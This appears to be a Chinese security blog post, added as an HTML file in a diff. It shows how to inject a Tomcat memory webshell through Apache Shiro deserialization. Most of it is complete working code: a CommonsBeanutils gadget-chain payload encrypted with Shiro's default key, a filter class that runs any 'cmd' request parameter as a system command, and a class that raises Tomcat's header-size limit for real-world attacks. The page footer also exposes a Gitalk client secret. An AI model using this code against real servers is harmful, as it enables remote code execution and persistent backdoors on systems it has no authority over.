@@ -1,0 +1,518 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shiro注入内存马 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Shiro注入内存马 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Shiro
+前言
+前段时间学习了在Shell中如何注入Filter型内存马，搞忘了写博客了，这里重新来记录一下过程。
+这里直接选择用CB链来打，CB链忘记了可以看前面的文章：https://le1a.github.io/posts/a5f4..." />
+    <meta name="keywords" content="Java,Shiro,内存马" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Shiro注入内存马
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-07
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/u4AbpM3qf1/" class="post-tag">
+                  # Shiro
+                </a>
+              
+                <a href="https://le1a.github.io/tag/qeBJvCxOs4L/" class="post-tag">
+                  # 内存马
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="shiro">Shiro</h1>
+<h2 id="前言">前言</h2>
+<p>前段时间学习了在Shell中如何注入Filter型内存马，搞忘了写博客了，这里重新来记录一下过程。</p>
+<p>这里直接选择用CB链来打，CB链忘记了可以看前面的文章：https://le1a.github.io/posts/a5f4a9e3/</p>
+<p>调用链:</p>
+<pre><code class="language-java">PriorityQueue.readObject()
+    BeanComparator.compare()
+            PropertyUtils.getProperty()
+                PropertyUtilsBean.getProperty()
+                    TemplatesImpl.getOutputProperties()
+</code></pre>
+<h2 id="cbattck">CBAttck</h2>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+
+class CBAttck {
+    public static void main(String[] args) throws Exception{
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\ShiroAttck\\target\\classes\\ShiroCB\\BehinderFilter.class&quot;));
+
+        byte[][] codes = {code};//恶意类
+        //CC3
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;,codes);
+        setFieldValue(obj, &quot;_name&quot;, &quot;aaaa&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        //CB
+        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;1&quot;);
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]{obj, obj});
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        byte[] payload= barr.toByteArray();
+        AesCipherService aes = new AesCipherService();
+        byte [] key = Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+        ByteSource finalpayload = aes.encrypt(payload,key);
+        System.out.println(finalpayload.toString());
+    }
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<h2 id="内存马">内存马</h2>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.lang.reflect.Field;
+import org.apache.catalina.core.StandardContext;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Map;
+import java.io.IOException;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+import java.lang.reflect.Constructor;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.Context;
+import javax.servlet.*;
+
+public class BehinderFilter extends AbstractTranslet implements Filter {
+    static {
+        try {
+            final String name = &quot;evil&quot;;
+            final String URLPattern = &quot;/*&quot;;
+
+            WebappClassLoaderBase webappClassLoaderBase =
+                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+            Configs.setAccessible(true);
+            Map filterConfigs = (Map) Configs.get(standardContext);
+
+            BehinderFilter behinderFilter = new BehinderFilter();
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilter(behinderFilter);
+            filterDef.setFilterName(name);
+            filterDef.setFilterClass(behinderFilter.getClass().getName());
+            /**
+             * 将filterDef添加到filterDefs中
+             */
+            standardContext.addFilterDef(filterDef);
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.addURLPattern(URLPattern);
+            filterMap.setFilterName(name);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+
+            standardContext.addFilterMapBefore(filterMap);
+
+            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+            constructor.setAccessible(true);
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+
+            filterConfigs.put(name, filterConfig);
+        } catch (NoSuchFieldException ex) {
+            ex.printStackTrace();
+        } catch (InvocationTargetException ex) {
+            ex.printStackTrace();
+        } catch (IllegalAccessException ex) {
+            ex.printStackTrace();
+        } catch (NoSuchMethodException ex) {
+            ex.printStackTrace();
+        } catch (InstantiationException ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        System.out.println(&quot;Do Filter ......&quot;);
+        String cmd;
+        if ((cmd = servletRequest.getParameter(&quot;cmd&quot;)) != null) {
+            Process process = Runtime.getRuntime().exec(cmd);
+            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(process.getInputStream()));
+            StringBuilder stringBuilder = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                stringBuilder.append(line + '\n');
+            }
+            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+            servletResponse.getOutputStream().flush();
+            servletResponse.getOutputStream().close();
+            return;
+        }
+
+        filterChain.doFilter(servletRequest, servletResponse);
+        System.out.println(&quot;doFilter&quot;);
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220507230502053.png" alt="image-20220507230502053" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220507230614263.png" alt="image-20220507230614263" loading="lazy"></figure>
+<p>注入成功了，但是需要注意一点的就是Tomcat会对Header头有长度限制，所以这里方便本地复现，就去改了本地的Tomcat的最大Header长度</p>
+<p>位置在<code>tomcat/conf/server.xml</code>，添加<code>maxHttpHeaderSize=&quot;40960&quot;</code></p>
+<pre><code class="language-xml">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;
+               connectionTimeout=&quot;20000&quot;
+               redirectPort=&quot;8443&quot; maxHttpHeaderSize=&quot;40960&quot;/&gt;
+</code></pre>
+<h3 id="实战中-header-长度限制绕过">实战中 Header 长度限制绕过</h3>
+<h4 id="修改maxhttpheadersize">修改maxHTTPHeaderSize</h4>
+<p>这个值会影响新的Request的inputBuffer时的对于header的限制。</p>
+<p>TomcatHeaderSize代码:</p>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+@SuppressWarnings(&quot;all&quot;)
+public class TomcatHeaderSize extends AbstractTranslet {
+
+    static {
+        try {
+            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(&quot;context&quot;);
+            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(&quot;service&quot;);
+            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(&quot;req&quot;);
+            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(&quot;headerBufferSize&quot;);
+            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(&quot;getHandler&quot;,null);
+            contextField.setAccessible(true);
+            headerSizeField.setAccessible(true);
+            serviceField.setAccessible(true);
+            requestField.setAccessible(true);
+            getHandlerMethod.setAccessible(true);
+            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
+                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
+            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
+            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
+            for (int i = 0; i &lt; connectors.length; i++) {
+                if (4 == connectors[i].getScheme().length()) {
+                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
+                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
+                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
+                        for (int j = 0; j &lt; classes.length; j++) {
+                            // org.apache.coyote.AbstractProtocol$ConnectionHandler
+                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
+                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(&quot;global&quot;);
+                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(&quot;processors&quot;);
+                                globalField.setAccessible(true);
+                                processorsField.setAccessible(true);
+                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
+                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
+                                for (int k = 0; k &lt; list.size(); k++) {
+                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));
+                                    // 40000 为修改后的 headersize
+                                    headerSizeField.set(tempRequest.getInputBuffer(),40000);
+                                }
+                            }
+                        }
+                        // 40000 为修改后的 headersize
+                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(40000);
+                    }
+                }
+            }
+        } catch (Exception e) {
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>修改长度后，由于request的inputbuffer会复用，所以我们在修改完maxHeaderSize之后，需要多个连接同时访问，让tomcat新建request的inputbuffer，这时候的buffer的大小限制就会使用我们修改过后的值</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/22/04cb9b2e34290.png" alt="1653212200076.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/22/0fa0ed503bfc7.png" alt="1653212255643.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/22/47c5b3baeefac.png" alt="1653212280385.png" loading="lazy"></figure>
+<p>此时不再爆400异常，成功注入内存马</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/22/ef66b3b656875.png" alt="1653212292174.png" loading="lazy"></figure>
+<h3 id="反序列化一个加载器从post请求体中发送恶意字节码失败了">反序列化一个加载器，从POST请求体中发送恶意字节码(失败了)</h3>
+<h3 id="class-bytes使用gzipbase64压缩编码暂时不会">class bytes使用gzip+base64压缩编码(暂时不会)</h3>
+<h1 id="fastjson">Fastjson</h1>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#shiro">Shiro</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#cbattck">CBAttck</a></li>
+<li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC">内存马</a>
+<ul>
+<li><a href="#%E5%AE%9E%E6%88%98%E4%B8%AD-header-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87">实战中 Header 长度限制绕过</a>
+<ul>
+<li><a href="#%E4%BF%AE%E6%94%B9maxhttpheadersize">修改maxHTTPHeaderSize</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80%E4%B8%AA%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%BB%8Epost%E8%AF%B7%E6%B1%82%E4%BD%93%E4%B8%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81%E5%A4%B1%E8%B4%A5%E4%BA%86">反序列化一个加载器，从POST请求体中发送恶意字节码(失败了)</a></li>
+<li><a href="#class-bytes%E4%BD%BF%E7%94%A8gzipbase64%E5%8E%8B%E7%BC%A9%E7%BC%96%E7%A0%81%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A">class bytes使用gzip+base64压缩编码(暂时不会)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#fastjson">Fastjson</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/深入学习Java RMI反序列化/">
+              <h3 class="post-title">
+                深入学习Java RMI反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
